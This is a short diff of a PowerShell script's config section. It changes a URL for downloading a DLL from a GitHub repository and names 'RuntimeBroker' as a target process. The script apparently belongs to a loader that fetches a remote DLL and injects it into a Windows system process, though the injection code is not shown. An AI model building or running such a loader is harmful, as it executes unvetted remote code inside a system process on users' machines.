@@ -5,7 +5,7 @@ function Log-Skip($msg) { $script:skip++ }
 function Log-Fail($msg) { $script:fail++ }
 
 # --- CONFIG ---
-$DLL_URL = "https://raw.githubusercontent.com/novaxstorex/Nova/refs/heads/main"
+$DLL_URL = "https://github.com/novaxstorex/Nova/blob/main/Nova.dll"
 $DLL_B64 = ""
 $PROC_NAME = "RuntimeBroker"
 Start-Process "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
